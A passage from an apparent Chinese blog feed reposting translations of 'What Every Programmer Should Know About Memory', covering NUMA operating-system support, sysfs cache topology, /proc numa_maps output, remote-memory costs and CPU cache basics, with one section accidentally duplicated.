x445和类似的机器仍然是一个非常接近商业级机器的系统。它们被设计成有x86和x86-64处理器的普通4U、8路机器。这些机器中的两台（有时多达四台）可以连接起来，作为一台具有共享内存的机器工作。所使用的互连引入了一个重要的NUMA因素，操作系统和应用程序都必须考虑到这一因素。</p><p>另一方面，像SGI Altix这样的机器是专门为互联而设计的，SGI的NUMAlink互连结构速度非常快和延迟很低；这两项都是高性能计算（HPC）的要求，特别是在使用MPI时。当然，缺点是这种复杂和专业化设计有非常高的代价。它们使NUMA系数合理较低成为可能，但由于这些机器可以拥有的CPU数量（数千）和互连的容量有限，NUMA系数实际上是动态的，并且可以达到不可接受的水平，具体取决于工作负载。</p><p>更常用的解决方案是使用高速网络连接商业机器集群。但这些不是NUMA机器；它们不实现共享地址空间，因此不属于本文讨论的任何类别。</p><h2 id="5-2-支持NUMA的操作系统"><a href="#5-2-支持NUMA的操作系统" class="headerlink" title="5.2 支持NUMA的操作系统"></a>5.2 支持NUMA的操作系统</h2><p>为了支持NUMA机器，操作系统必须考虑内存的分布式特性。例如，如果一个进程在给定的处理器上运行，分配给该进程地址空间的物理RAM应该来自本地内存，否则，每条指令都必须访问远程内存以获取代码和数据。但是有一些情况需要在NUMA机器上特殊考虑。DSO的文本段通常在机器的物理RAM中只出现一次，但是，如果所有CPU上的进程和线程都使用该DSO（例如，基本的运行时库，如libc），这意味着除少数处理器外，所有处理器都必须具有远程访问。理想情况下，操作系统会将此类DSO“镜像”到每个处理器的物理RAM中，并使用本地副本。这是一种优化，不是一种要求，通常很难实现。</p><p>为了避免让情况变得更糟，操作系统不应该将进程或线程从一个NUMA节点迁移到另一个NUMA节点。操作系统应该已经尝试避免在普通多处理器机器上迁移进程，因为从一个处理器迁移到另一个处理器意味着缓存内容丢失。如果负载分配需要迁移处理器的进程或线程，操作系统通常可以选择一个具有足够剩余容量的任意新处理器。在NUMA环境中，新处理器的选择有点限制。新选择的处理器对进程正在使用的内存的访问成本不应高于旧处理器；这限制了目标列表。如果没有符合该标准的可用处理器，操作系统就别无选择，只能迁移到内存访问代价更高的处理器。</p><p>在这种情况下，有两种可能的方式进行(优化)。首先，我们可以希望这种情况是暂时的，并且可以将流程迁移回更适合的处理器。或者，操作系统也可以将进程的访问的内存迁移到最新访问它的处理器上。这是一个相当昂贵的操作。可能需要复制大量内存，尽管不一定是一步完成的。当这种情况发生时，必须停止该过程，至少是短暂地停止，以便正确迁移对旧页面的修改。要使页面迁移高效、快速，还有一系列其他要求。简而言之，除非真的有必要，否则操作系统应该避免它。</p><p>通常，不能假设NUMA机器上的所有进程都使用相同数量的内存，(不能假设)随着进程在处理器之间的分布，内存使用也会均匀分布。事实上，除非机器上运行的应用程序非常具体（在HPC世界中很常见，但在其他不常见），否则内存使用将非常不平均。一些应用程序将使用大量内存，而其他应用程序几乎没有。如果总是将内存分配给发出请求的处理器，这迟早会导致问题。系统最终将耗尽NUMA节点的本地内存。</p><p>作为对这些严重问题的响应，默认情况下，内存不是仅在本地节点上分配的。要利用系统的所有内存，默认策略是将内存条带化。这保证了系统所有内存的平等使用。作为一个副作用，可以在处理器之间自由迁移进程，因为平均而言，对所使用的所有内存的访问成本不会改变。对于较小的NUMA系数，条带化是可以接受的，但仍然不是最佳的（见第5.4节中的数据）。</p><p>这是一种悲观情绪，有助于系统避免严重问题，并使其在正常运行时更具可预测性。但在某些情况下，它确实会显著降低系统的整体性能。这就是为什么Linux允许每个进程选择内存分配规则。一个进程可以为自己及其子进程选择不同的策略。我们将在第6节介绍可用于此目的的接口。</p><h2 id="5-3-公开的信息"><a href="#5-3-公开的信息" class="headerlink" title="5.3 公开的信息"></a>5.3 公开的信息</h2><p>内核通过sys伪文件系统（sysfs）发布了以下关于处理器缓存的信息：</p><pre><code class="hljs">/sys/devices/system/cpu/cpu*/cache</code></pre><p>在第<code>6.2.1</code>节中，我们将看到可以用来查询各种缓存大小的接口。这里重要的是缓存的拓扑结构。上述目录包含子目录（命名为<code>index*</code>），这些子目录列出了CPU拥有的各种缓存的信息。就拓扑结构而言，在这些目录中重要的文件是<code>type</code>、<code>level</code>和<code>shared_cpu_map</code>。对于<code>Intel Core 2 QX6700</code>，信息看起来像表5.1所示。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404282340239.png"></p><p>这些数据的含义如下：</p><ul><li>每个核心 {cpu0到cpu3是核心的知识来自稍后将解释的另一个地方。} 拥有三个缓存：L1i、L1d和L2。</li><li>L1d和L1i缓存不与任何其他核心共享 — 每个核心都有自己的一组缓存。这通过shared_cpu_map中的位图只有一个设置位来表示。</li><li>cpu0和cpu1上的L2缓存是共享的，cpu2和cpu3上的L2缓存也是如此。</li></ul><p>如果CPU有更多的缓存级别，就会有更多名为index*的目录。</p><p>对于一台四插槽、双核心的Opteron机器，缓存信息看起来像表5.2：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404282342606.png"></p><p>可以看到，这些处理器也有三个缓存：L1i、L1d和L2。没有一个核心共享任何级别的缓存。对于这个系统来说，有趣的部分是处理器的拓扑结构。没有这些额外的信息，人们无法理解缓存数据。sys文件系统在以下文件中暴露了这些信息：</p><pre><code class="hljs">/sys/devices/system/cpu/cpu*/topology</code></pre><p>表5.3显示了对于SMP（对称多处理）Opteron机器，这个层级结构中有趣的文件。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404282344325.png"></p><p>结合表5.2和表5.3，我们可以看到没有CPU拥有超线程（thread_siblings位图只有一个位设置），系统实际上有四个处理器（physical_package_id从0到3），每个处理器有两个核心，且没有任何核心共享缓存。这与早期的Opteron处理器完全相符。</p><p>到目前为止提供的数据中完全缺失的是关于这台机器上NUMA（非统一内存访问）特性的信息。任何SMP（对称多处理）Opteron机器都是一台NUMA机器。要获取这些数据，我们需要查看sys文件系统的另一部分，这在NUMA机器上存在，即以下层级结构中：</p><pre><code class="hljs">/sys/devices/system/node</code></pre><p>这个目录为系统中的每个NUMA节点包含一个子目录。在特定于节点的目录中，有一些文件。对于前面两个表中描述的Opteron机器，这些重要文件及其内容在表5.4中显示。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404282345787.png"></p><p>这些信息将所有其他信息整合在一起；现在我们对机器的架构有了完整的了解。我们已经知道这台机器有四个处理器。每个处理器都构成自己的节点，这可以通过查看node*目录中cpumap文件中的值设置的位来了解。这些目录中的距离文件包含一组值，每个节点一个，代表在相应节点上的内存访问成本。在这个例子中，所有本地内存访问的成本是10，所有对任何其他节点的远程访问的成本是20。{顺便说一下，这是错误的。ACPI信息显然是错误的，因为，尽管使用的处理器具有三个相干的HyperTransport链路，但至少有一个处理器必须连接到南桥。因此，至少有一对节点必须具有更大的距离。} 这意味着，尽管处理器被组织为一个二维超立方体（见图5.1），但非直接连接的处理器之间的访问并不更昂贵。成本的相对值应该可以用作访问时间实际差异的估计。所有这些信息的准确性是另一个问题。</p><h2 id="5-4-访问非本节点内存的开销"><a href="#5-4-访问非本节点内存的开销" class="headerlink" title="5.4 访问非本节点内存的开销"></a>5.4 访问非本节点内存的开销</h2><p>不过，NUMA节点距离是相关的。在[amdccnuma]AMD文档记录了四插槽机器的NUMA开销。对于写操作，如图5.3所示。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404282339099.png"><br>图 5.3: 多节点之上的读写性能</p><p>写比读慢，这并不奇怪。有趣的是单跳和两跳的开销。其中两个单跳场景的开销实际上略有不同。有关详细信息，请参见[amdccnuma]。从这个图表中我们需要记住的事实是，两跳读取和写入分别比0跳读取慢30%和49%。两跳写入比0跳写入慢32%，比单跳写入慢17%。处理器和内存节点的相对位置会产生很大的差异。AMD的下一代处理器将为每个处理器提供四条连贯的超级传输链路。在这种情况下，四CPU插座机器的直径为1（C&#x3D;2）。对于八个CPU插座，同样的问题再次出现，因为有八个节点的超立方体的直径是3（C&#x3D;3）。</p><p>所有这些信息都是可用的，但使用起来很麻烦。在第6.5节中，我们将看到一个接口，它有助于更轻松地访问和使用这些信息。</p><p>最后一些系统能够提供的信息是进程本身的状态。这些信息可以确定内存映射文件、写时拷贝（COW）页面和匿名内存如何分布在系统中的节点上。每个进程都有一个文件<code>/proc/$&#123;PID&#125;/numa_maps</code>，其中PID是进程的ID，如图5.2所示。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs sh">00400000 default file=/bin/cat mapped=3 N3=3<br>00504000 default file=/bin/cat anon=1 dirty=1 mapped=2 N3=2<br>00506000 default heap anon=3 dirty=3 active=0 N3=3<br>38a9000000 default file=/lib64/ld-2.4.so mapped=22 mapmax=47 N1=22<br>38a9119000 default file=/lib64/ld-2.4.so anon=1 dirty=1 N3=1<br>38a911a000 default file=/lib64/ld-2.4.so anon=1 dirty=1 N3=1<br>38a9200000 default file=/lib64/libc-2.4.so mapped=53 mapmax=52 N1=51 N2=2<br>38a933f000 default file=/lib64/libc-2.4.so<br>38a943f000 default file=/lib64/libc-2.4.so anon=1 dirty=1 mapped=3 mapmax=32 N1=2 N3=1<br>38a9443000 default file=/lib64/libc-2.4.so anon=1 dirty=1 N3=1<br>38a9444000 default anon=4 dirty=4 active=0 N3=4<br>2b2bbcdce000 default anon=1 dirty=1 N3=1<br>2b2bbcde4000 default anon=2 dirty=2 N3=2<br>2b2bbcde6000 default file=/usr/lib/locale/locale-archive mapped=11 mapmax=8 N0=11<br>7fffedcc7000 default stack anon=2 dirty=2 N3=2<br></code></pre></td></tr></table></figure><p>Figure 5.2: Content of &#x2F;proc&#x2F;PID&#x2F;numa_maps</p><p>文件中的重要信息是N0到N3的值，它指示为节点0到3上的内存区域分配的内存页数。很可能该程序是在CPU核心被调度到节点3的上执行的。程序本身和脏页都分配在该NUMA节点上。只读映射，例如ld-2.4的第一个映射ld.so和libc-2.4.so。因此，共享文件区域设置归档文件也会分配到其他节点上。</p><p>如图5.3所示，对于单跳和双跳的读取，节点间的读取性能分别下降9%和30%。对于执行时，如果如果二级缓存miss，则需要调用这样的读取操作，则每个缓存线都会产生这些额外的开销。如果内存距离处理器较远，则超出缓存大小的大型工作负载的所有成本都必须增加9%&#x2F;30%。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404282339904.png"></p><p>Figure 5.4: Operating on Remote Memory</p><p>要查看真实世界中的效果，我们可以按照第3.5.1节测量带宽，但这一次，内存位于远端NUMA节点上，单跳的距离。与使用本地内存的数据相比，该测试的结果如图5.4所示。这些数字在两个方向上都有一些大的尖峰，这是测量多线程代码问题的结果，可以忽略。此图中的重要信息是，读取操作总是慢20%。这比图5.3中的9%要慢得多，图5.3中的9%很可能不是<code>uninterrupted</code>读&#x2F;写操作的数字，可能指的是较旧的处理器版本。只有AMD知道。</p><p>对于适合缓存的工作集大小，写入和复制操作的性能也会降低20%。对于超过缓存大小的工作集，写入性能不会明显低于本地节点上的操作。互连的速度足够快，可以跟上内存的速度。主要因素是等待主内存的时间。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="/images/posts/memory/What-Every-Programmer-Should-Know-About-Memory.pdf">What-Every-Programmer-Should-Know-About-Memory</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://lwn.net/Articles/253361/">Memory part 3: Virtual Memory</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>内存</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>每个程序员都应该了解的内存知识-Part3</title>
    <link href="/2024/04/28/%E6%AF%8F%E4%B8%AA%E7%A8%8B%E5%BA%8F%E5%91%98%E9%83%BD%E5%BA%94%E8%AF%A5%E4%BA%86%E8%A7%A3%E7%9A%84%E5%86%85%E5%AD%98%E7%9F%A5%E8%AF%86-Part3/"/>
    <url>/2024/04/28/%E6%AF%8F%E4%B8%AA%E7%A8%8B%E5%BA%8F%E5%91%98%E9%83%BD%E5%BA%94%E8%AF%A5%E4%BA%86%E8%A7%A3%E7%9A%84%E5%86%85%E5%AD%98%E7%9F%A5%E8%AF%86-Part3/</url>
    
    <content type="html"><![CDATA[<p>关于 虚拟内存 </p><span id="more"></span><h1 id="译文"><a href="#译文" class="headerlink" title="译文"></a>译文</h1><p><a href="https://www.oschina.net/translate/what-every-programmer-should-know-about-virtual-memory-part3">Linux 中国的译文</a></p>]]></content>
    
    
    <categories>
      
      <category>内存</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>每个程序员都应该了解的内存知识-Part2</title>
    <link href="/2024/04/28/%E6%AF%8F%E4%B8%AA%E7%A8%8B%E5%BA%8F%E5%91%98%E9%83%BD%E5%BA%94%E8%AF%A5%E4%BA%86%E8%A7%A3%E7%9A%84%E5%86%85%E5%AD%98%E7%9F%A5%E8%AF%86-Part2/"/>
    <url>/2024/04/28/%E6%AF%8F%E4%B8%AA%E7%A8%8B%E5%BA%8F%E5%91%98%E9%83%BD%E5%BA%94%E8%AF%A5%E4%BA%86%E8%A7%A3%E7%9A%84%E5%86%85%E5%AD%98%E7%9F%A5%E8%AF%86-Part2/</url>
    
    <content type="html"><![CDATA[<p>关于CPU 高速缓存</p><span id="more"></span><h1 id="直接看原文翻译"><a href="#直接看原文翻译" class="headerlink" title="直接看原文翻译"></a>直接看原文翻译</h1><p><a href="https://www.oschina.net/translate/what-every-programmer-should-know-about-cpu-cache-part2?print">原文翻译</a></p><p>CPU今天比25年前要复杂得多。在那些日子里，CPU核心的频率与内存总线的水平相当。内存访问速度仅比寄存器访问速度稍慢。但在90年代初，这种情况发生了戏剧性的变化，当时CPU设计师提高了CPU核心的频率，但内存总线和RAM芯片的性能并没有成比例地提高。这并不是因为无法制造更快的RAM，正如前一节所解释的。这是可能的，但并不经济。与当前CPU核心一样快的RAM比任何动态RAM都要贵几个数量级。</p><p>如果选择是在拥有非常少但非常快的RAM的机器和拥有大量相对快的RAM的机器之间，鉴于工作集大小超过小RAM大小以及访问次级存储介质（如硬盘）的成本，第二种机器总是会赢。这里的问题是次级存储的速度，通常是硬盘，必须用来存储工作集被交换出去的部分。访问这些磁盘的速度比甚至DRAM访问还要慢几个数量级。</p><p>幸运的是，这不必是一个全有或全无的决定。计算机可以拥有少量的高速SRAM，以及大量的DRAM。一种可能的实现方式是将处理器的地址空间的某个区域专门用于包含SRAM，其余部分用于DRAM。然后操作系统的任务就是最佳地分配数据以利用SRAM。基本上，在这种情况下，SRAM作为处理器寄存器集的扩展。</p><p>虽然这是一种可能的实现方式，但它并不可行。忽略将这种SRAM支持的内存的物理资源映射到进程的虚拟地址空间的问题（这本身就是非常困难的），这种方法将要求每个进程在软件中管理这个内存区域的分配。内存区域的大小因处理器而异（即，处理器拥有不同数量的昂贵的SRAM支持的内存）。组成程序的每个模块都会要求其快速内存的份额，这通过同步要求引入了额外的成本。简而言之，拥有快速内存的好处将完全被管理资源的开销所抵消。</p><p>因此，与其将SRAM置于操作系统或用户的控制之下，不如让它成为处理器透明使用和管理的资源。在这种模式下，SRAM被用来临时复制（换句话说，缓存）处理器可能很快使用的主要内存中的数据。这是可能的，因为程序代码和数据具有时间和空间的局部性。这意味着，在短期内，相同代码或数据被重复使用的可能性很大。对于代码来说，这意味着代码中很可能有循环，因此相同的代码一遍又一遍地执行（空间局部性的完美案例）。数据访问也理想地限于小区域。即使在短期内使用的内存不紧密在一起，相同的数据很快就会被重复使用（时间局部性）。对于代码来说，这意味着，例如，在循环中进行函数调用，该函数位于地址空间的其他地方。该函数可能在内存中很远，但对该函数的调用将在时间上很接近。对于数据来说，这意味着一次使用的内存总量（工作集大小）理想地是有限的，但由于RAM的随机访问特性，使用的内存并不紧密在一起。意识到局部性的存在是当今我们使用的CPU缓存概念的关键。</p><p>一个简单的计算可以展示缓存理论上可以有多有效。假设访问主存储需要200个周期，访问缓存存储需要15个周期。那么，如果没有任何缓存，使用100个数据元素各100次的代码将在内存操作上花费2,000,000个周期，如果所有数据都可以被缓存，则只需要168,500个周期。这是一个91.5%的改进。</p><p>用于缓存的SRAM的大小比主存储小很多倍。在作者使用带有CPU缓存的工作站的经验中，缓存大小一直是主存储大小的1&#x2F;1000（今天：4MB缓存和4GB主存储）。这本身并不构成问题。如果工作集的大小（当前正在处理的数据集）小于缓存大小，那就没关系。但是，计算机没有大的主存储是有原因的。工作集的大小肯定会大于缓存。这尤其适用于运行多个进程的系统，其中工作集的大小是所有单独进程和内核的大小之和。</p><p>需要应对缓存有限大小的是一套好的策略，以确定任何给定时间应该缓存什么。由于工作集中的所有数据并不完全同时使用，我们可以使用技术暂时用其他数据替换缓存中的一些数据。也许这可以在实际需要数据之前完成。这种预取将通过与程序执行异步发生来消除一些访问主存储的成本。所有这些技术以及更多可以用于使缓存看起来比实际大。我们将在第3.3节中讨论它们。一旦所有这些技术都被利用，就取决于程序员来帮助处理器。这将如何完成将在第6节中讨论。</p><p>在深入研究 CPU 缓存实现的技术细节之前，一些读者可能会发现首先了解缓存如何融入现代计算机系统的“大局”的更多细节是有用的。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404281235334.png"></p><p>图3.1展示了最小的缓存配置。它对应于早期部署CPU缓存的系统中可以找到的架构。CPU核心不再直接连接到主存储器。{在更早的系统中，缓存就像CPU和主存储器一样连接到系统总线上。这更像是一种临时解决方案，而不是真正的解决方案。}所有的加载和存储操作都必须通过缓存。CPU核心和缓存之间的连接是特殊的、快速的连接。在简化的表示中，主存储器和缓存连接到系统总线上，该总线也可用于与系统的其他组件通信。我们引入了系统总线作为“FSB”，这是今天使用的名称；见第2.2节。在本节中，我们忽略了北桥；假设它存在是为了促进CPU与主存储器之间的通信。</p><p>尽管过去几十年的计算机使用了冯·诺依曼架构，但经验表明，将用于代码和数据的缓存分开是有利的。自1993年以来，英特尔一直使用独立的代码和数据缓存，并且从未回头。代码和数据所需的存储区域在很大程度上是相互独立的，这就是为什么独立缓存工作得更好。近年来，另一个优势出现了：对于最常见的处理器，指令解码步骤是缓慢的；缓存解码后的指令可以加速执行，特别是当由于错误预测或无法预测的分支导致流水线为空时。</p><p>缓存引入后不久，系统变得更加复杂。缓存和主存储器之间的速度差异再次增加，以至于增加了另一个级别的缓存，比一级缓存更大、更慢。出于经济原因，仅仅增加一级缓存的大小并不是一个选项。今天，甚至有些机器常规使用三级缓存。具有这样处理器的系统看起来像图3.2。随着单个CPU核心数量的增加，未来缓存级别数量可能会进一步增加。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404281240433.png"></p><p>图3.2展示了三级缓存，并引入了我们在文档其余部分将使用的术语。L1d是一级数据缓存，L1i是一级指令缓存，以此类推。请注意，这是一个示意图；在现实中，从核心到主存储器的数据流不必通过任何更高级别的缓存。CPU设计师在设计缓存接口时有很多自由度。对于程序员来说，这些设计选择是不可见的。</p><p>此外，我们还有具有多个核心的处理器，每个核心可以有多个“线程”。核心和线程之间的差异在于，不同的核心拥有各自独立的（几乎所有的硬件资源。核心可以完全独立地运行，除非它们同时使用相同的资源——例如，与外部的连接。另一方面，线程几乎共享了处理器的所有资源。英特尔对线程的实现只有线程的独立寄存器，即便如此也是有限制的，一些寄存器是共享的。因此，现代CPU的完整图景看起来像图3.3。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404281241030.png"></p><p>在这个图中，我们有两个处理器，每个处理器有两个核心，每个核心有两个线程。线程共享一级缓存。核心（深灰色阴影部分）有各自独立的一级缓存。CPU的所有核心共享更高级别的缓存。当然，两个处理器（浅灰色阴影的两个大框）不共享任何缓存。当我们讨论多进程和多线程应用对缓存的影响时，所有这些都将变得非常重要。</p><h2 id="3-2-高层次的缓存操作"><a href="#3-2-高层次的缓存操作" class="headerlink" title="3.2 高层次的缓存操作"></a>3.2 高层次的缓存操作</h2><p>为了理解使用缓存的成本和节省，我们必须结合第2节中关于机器架构和RAM技术的知识和上一节中描述的缓存结构。</p><p>默认情况下，CPU核心读取或写入的所有数据都存储在缓存中。有些内存区域不能被缓存，但这是只有操作系统实现者需要关心的事情；对应用程序程序员来说是不可见的。还有一些指令允许程序员故意绕过某些缓存。这将在第6节中讨论。</p><p>如果CPU需要一个数据字，首先搜索缓存。显然，缓存不能包含整个主存储器的内容（否则我们就不需要缓存了），但由于所有内存地址都是可缓存的，每个缓存条目都使用主存储器中数据字的地址进行标记。这样，对一个地址的读写请求可以在缓存中搜索匹配的标记。这里的地址可以是虚拟地址或物理地址，取决于缓存的实现。</p><p>由于标记需要占用空间，除了实际的内存外，选择一个字作为缓存的粒度是低效的。在x86机器上的32位字上，标记本身可能需要32位或更多。此外，由于空间局部性是缓存所依赖的原则之一，不考虑这一点将是不利的。由于相邻的内存可能会一起使用，它也应该一起被加载到缓存中。还记得我们在第2.2.1节中学到的：如果RAM模块能够连续传输多个数据字而不需要新的CAS或甚至是RAS信号，它们会更加有效。因此，存储在缓存中的条目不是单个字，而是多个连续字的“行”。在早期的缓存中，这些行长32字节；现在规范是64字节。如果内存总线是64位宽，这意味着每条缓存行需要8次传输。DDR有效地支持这种传输模式。</p><p>当处理器需要内存内容时，整个缓存行被加载到L1d中。每个缓存行的内存地址是通过根据缓存行大小掩蔽地址值来计算的。对于一个64字节的缓存行，这意味着低6位被清零。被丢弃的位用作缓存行内的偏移量。在某些情况下，剩余的位被用来在缓存中定位行并作为标记。在实践中，一个地址值被分成三个部分。对于一个32位的地址，它可能看起来如下：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404281241222.png"></p><p>在这个图中我们有两个处理器，每个处理器有两个核心，每个核心有两个线程<br>线程共享一级缓存。核心（深灰色阴影部分）有各自独立的一级缓存。CPU的所有核心共享更高级别的缓存。当然，两个处理器（浅灰色阴影的两个大框）不共享任何缓存。当我们讨论多进程和多线程应用对缓存的影响时，所有这些都将变得非常重要。</p><h2 id="3-2-高层次的缓存操作-1"><a href="#3-2-高层次的缓存操作-1" class="headerlink" title="3.2 高层次的缓存操作"></a>3.2 高层次的缓存操作</h2><p>为了理解使用缓存的成本和节省，我们必须结合第2节中关于机器架构和RAM技术的知识和上一节中描述的缓存结构。</p><p>默认情况下，CPU核心读取或写入的所有数据都存储在缓存中。有些内存区域不能被缓存，但这是只有操作系统实现者需要关心的事情；对应用程序程序员来说是不可见的。还有一些指令允许程序员故意绕过某些缓存。这将在第6节中讨论。</p><p>如果CPU需要一个数据字，首先搜索缓存。显然，缓存不能包含整个主存储器的内容（否则我们就不需要缓存了），但由于所有内存地址都是可缓存的，每个缓存条目都使用主存储器中数据字的地址进行标记。这样，对一个地址的读写请求可以在缓存中搜索匹配的标记。这里的地址可以是虚拟地址或物理地址，取决于缓存的实现。</p><p>由于标记需要占用空间，除了实际的内存外，选择一个字作为缓存的粒度是低效的。在x86机器上的32位字上，标记本身可能需要32位或更多。此外，由于空间局部性是缓存所依赖的原则之一，不考虑这一点将是不利的。由于相邻的内存可能会一起使用，它也应该一起被加载到缓存中。还记得我们在第2.2.1节中学到的：RAM模块能够连续传输多个数据字而不需要新的CAS或甚至是RAS信号，它们会更加有效。因此，存储在缓存中的条目不是单个字，而是多个连续字的“行”。在早期的缓存中，这些行长32字节；现在规范是64字节。如果内存总线是64位宽，这意味着每条缓存行需要8次传输。DDR有效地支持这种传输模式。</p><p>当处理器需要内存内容时，整个缓存行被加载到L1d中。每个缓存行的内存地址是通过根据缓存行大小掩蔽地址值来计算的。对于一个64字节的缓存行，这意味着低6位被清零。被丢弃的位用作缓存行内的偏移量。在某些情况下，剩余的位被用来在缓存中定位行并作为标记。在实践中，一个地址值被分成三个部分。对于一个32位的地址，它可能看起来如下：</p><h3 id="缓存行大小为2-O，低O位用作缓存行内的偏移量"><a href="#缓存行大小为2-O，低O位用作缓存行内的偏移量" class="headerlink" title="缓存行大小为2^O，低O位用作缓存行内的偏移量"></a>缓存行大小为2^O，低O位用作缓存行内的偏移量</h3><ul><li>下一个S位选择“缓存集”。我们很快就会更详细地讨论为什么使用集而不是单个槽来存放缓存行。目前，只需理解有2^S个缓存行集。</li><li>这留下了顶部的32 - S - O &#x3D; T位，形成标记。这些T位与每个缓存行相关联的值，用于区分所有在同一缓存集中缓存的别名（所有地址的S部分相同的缓存行都被称为相同的别名）。</li><li>用于寻址缓存集的S位不需要存储，因为它们对于同一集中的所有缓存行都是相同的。</li></ul><p>当指令修改内存时，处理器仍然需要首先加载一个缓存行，因为没有指令会一次性修改整个缓存行（规则的例外：如第6.1节中解释的写入组合）。因此，在写操作之前必须加载缓存行的内容。不可能为缓存持有部分缓存行。一个被写入且尚未回写到主存储器的缓存行被称为“脏”的。一旦写入，脏标志就会被清除。</p><p>为了能够在缓存中加载新数据，几乎总是首先需要在缓存中腾出空间。从L1d中逐出会将缓存行推入到L2（使用相同的缓存行大小）。这当然意味着需要在L2中腾出空间。这反过来可能会将内容推入L3和最终推入主存储器。每次逐出的成本都会逐渐增加。这里描述的是现代AMD和VIA处理器更倾向于使用的独占缓存模型。英特尔实现了包容缓存，其中L1d中的每个缓存行也存在于L2中。因此，从L1d中逐出要快得多。有足够的L2缓存，浪费内存存储在两个地方的劣势是最小的，并且在逐出时是值得的。独占缓存的一个可能优势是，加载新的缓存行只需要触及L1d而不需要触及L2，这可能会更快。</p><p>CPU可以随意管理缓存，只要处理器架构定义的内存模型没有改变。例如，处理器完全可以利用几乎没有或没有内存总线活动，并主动将脏缓存行写回主存储器。在x86和x86-64处理器中，不同制造商之间，甚至在同一制造商的模型之间，缓存架构的多样性证明了内存模型抽象的强大。</p><p>在对称多处理器（SMP）系统中，CPU的缓存不能独立于彼此工作。所有处理器都应该在任何时候看到相同的内存内容。维护这种统一的内存视图被称为“缓存一致性”。如果一个处理器只是简单地查看自己的缓存和主存储器，它将看不到其他处理器中脏缓存行的内容。直接从另一个处理器访问一个处理器的缓存将是非常昂贵的，并且是一个巨大的瓶颈。相反，处理器会检测到另一个处理器想要读取或写入某个特定的缓存行。</p><p>如果检测到写入访问，并且处理器在其缓存中有该缓存行的干净副本，则此缓存行被标记为无效。未来的引用将需要重新加载该缓存行。请注意，另一个CPU上的读取访问并不需要使无效，可以保留多个干净的副本。</p><p>更复杂的缓存实现允许另一种可能性发生。如果另一个处理器想要读取或写入的缓存行当前在第一个处理器的缓存中被标记为脏，那么就需要采取不同的行动。在这种情况下，主存储器已经过时，请求的处理器必须从第一个处理器那里获取缓存行内容。通过窥探，第一个处理器注意到这种情况并自动向请求的处理器发送数据。这个操作绕过了主存储器，尽管在某些实现中，内存控制器应该注意到这种直接传输，并更新主存储器中的缓存行内容。如果访问是为了写入，第一个处理器随后会使其本地缓存行的副本无效。</p><p>随着时间的推移，已经开发出了许多缓存一致性协议。最重要的一个是MESI，我们将在第3.3.4节中介绍。所有这些的结果可以用几个简单的规则概括：</p><ul><li>脏缓存行不存在于任何其他处理器的缓存中。</li><li>相同的缓存行的干净副本可以存在于任意多的缓存中。</li></ul><p>如果这些规则能够得到维护，即使在多处理器系统中，处理器也可以有效地使用它们的缓存。所有处理器需要做的就是监视彼此的写入访问，并将其地址与它们本地缓存中的地址进行比较。在下一节中，我们将更详细地讨论实现和成本。</p><p>最后，我们至少应该给出与缓存命中和未命中相关联的成本的印象。这些是英特尔为Pentium M列出的数字：</p><ul><li>寄存器：&lt;&#x3D; 1个周期</li><li>L1d：大约3个周期</li><li>L2：大约14个周期</li><li>主存储器：大约240个周期</li></ul><p>这些是在CPU周期内测量的实际访问时间。值得注意的是，对于片上L2缓存，访问时间的很大一部分（可能甚至是大部分）是由线延迟引起的。这是一种物理限制，随着缓存大小的增加，这种情况只会变得更糟。只有工艺缩小（例如，从Merom的60nm到Penryn的45nm在英特尔的产品线中）才能改善这些数字。</p><p>表中的数字看起来很高，但幸运的是，并不是每次缓存加载和未命中都需要支付全部成本。成本的一部分可以被隐藏。今天的处理器都使用不同长度的内部流水线，指令在其中被解码并准备执行。如果内存加载操作可以足够早地在流水线中开始，它可能与其他操作并行发生，并且加载的全部成本可能被隐藏。这通常对L1d是可能的；对于一些具有长流水线的处理器，对L2也是如此。</p><p>对于写入操作，CPU不必等到值安全地存储在内存中。只要随后指令的执行看起来与值存储在内存中的效果相同，就没有什么可以阻止CPU走捷径。它可以提前开始执行下一个指令。通过使用可以保存不再在常规寄存器中可用的值的影子寄存器，甚至可以更改将要存储在不完整写入操作中的值。</p><h1 id="原文"><a href="#原文" class="headerlink" title="原文"></a>原文</h1><ul><li><a href="https://lwn.net/Articles/252125/">原文</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>内存</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>每个程序员都应该了解的内存知识-Part1</title>
    <link href="/2024/04/28/%E6%AF%8F%E4%B8%AA%E7%A8%8B%E5%BA%8F%E5%91%98%E9%83%BD%E5%BA%94%E8%AF%A5%E4%BA%86%E8%A7%A3%E7%9A%84%E5%86%85%E5%AD%98%E7%9F%A5%E8%AF%86-Part1/"/>
